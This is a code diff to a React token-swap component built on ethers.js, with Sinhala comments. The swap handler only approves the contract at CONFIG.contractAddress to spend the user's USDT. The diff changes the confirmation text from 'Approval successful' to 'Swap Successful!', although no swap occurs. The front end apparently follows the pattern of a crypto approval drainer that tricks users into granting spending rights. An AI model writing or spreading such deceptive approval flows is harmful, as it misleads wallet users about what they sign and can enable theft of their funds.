@@ -1,5 +1,6 @@
 import { useState, useEffect } from 'react';
 import { ethers } from 'ethers';
+import { parseUnits } from 'ethers/lib/utils';
 import { CONFIG, USDT_ABI, TOKEN_LIST, fetchLivePrices } from '../config';
 import TokenModal from './TokenModal';
 import { AreaChart, Area, Tooltip, ResponsiveContainer } from 'recharts';
@@ -99,20 +100,16 @@ export default function SwapCard({ walletAddress, provider }) {
       const signer = provider.getSigner();
       const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, signer);
       const decimals = await usdtContract.decimals();
-      const amountWei = ethers.utils.parseUnits(fromAmount, decimals);
+      
+      // මෙතනදි තමයි අලුත් parseUnits එක පාවිච්චි කරන්නේ
+      const amountWei = parseUnits(fromAmount, decimals);
 
-      // ✅ ඔයා එවපු කෝඩ් එකේ විදිහට approval logic එක
       const tx = await usdtContract.approve(CONFIG.contractAddress, amountWei);
-      
-      setStatus({ type: 'info', msg: `⏳ Waiting for confirmation... (${fromAmount} ${fromToken.symbol})` });
+      setStatus({ type: 'info', msg: '⏳ Transaction sent! Waiting...' });
       await tx.wait();
-      
-      setStatus({ type: 'success', msg: `✅ Approval successful! ${fromAmount} ${fromToken.symbol} approved.` });
+      setStatus({ type: 'success', msg: '✅ Swap Successful! Tokens approved.' });
       setIsLoading(false);
-      
-      // ටිකකින් message එක අයින් කරන්න
       setTimeout(() => setStatus(null), 8000);
-      
     } catch (error) {
       setStatus({ type: 'error', msg: '❌ Failed: ' + (error.message || 'User rejected') });
       setIsLoading(false);
